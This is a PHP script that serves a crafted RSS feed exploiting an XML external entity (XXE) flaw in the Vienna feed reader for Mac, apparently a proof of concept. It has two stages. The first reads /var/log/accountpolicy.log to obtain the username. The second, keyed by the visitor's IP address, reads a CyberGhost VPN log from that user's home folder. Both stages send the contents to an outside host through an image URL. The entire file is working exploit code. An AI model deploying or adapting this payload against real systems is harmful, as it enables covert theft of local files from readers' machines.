<?php 
echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
$user = unserialize(file_get_contents('ipdatas.txt'));
if(empty($user[$_SERVER['REMOTE_ADDR']])) {
?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///var/log/accountpolicy.log" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
    <title>Exploiting XXE in Vienna for Mac</title>
    <link>http://example.com/</link>
    <description>A blog about things</description>
    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
    <item>
        <title>Phase 1: Sending Mac OS User's Username</title>
        <link>http://example.com</link>
        <description>Information read from /var/log/accountpolicy.log &lt;img src='http://rockhouse.ga/ViennaExploit/readfile.php?p=1&amp;d=&xxe;'&gt;</description>
        <author>NRockhouse</author>
        <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
    </item>
</channel>
</rss>
<?php
} else {
?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///Users/<?php echo $user[$_SERVER['REMOTE_ADDR']]; ?>/Library/Application%20Support/CyberGhost%205/CyberGhostMacLogScripts.log" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
    <title>Exploiting XXE in Vienna for Mac</title>
    <link>http://example.com/</link>
    <description>A blog about things</description>
    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
    <item>
        <title>Phase 2: Sending Logs From A VPN App (CyberGhost 5)</title>
        <link>http://example.com</link>
        <description>Information read from /Users/<?php echo $user[$_SERVER['REMOTE_ADDR']]; ?>/Library/Application Support/CyberGhost 5/CyberGhostMacLogScripts.log &lt;img src='http://rockhouse.ga/ViennaExploit/readfile.php?d=&xxe;'&gt;</description>
        <author>NRockhouse</author>
        <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
    </item>
</channel>
</rss>
<?php
}
?>
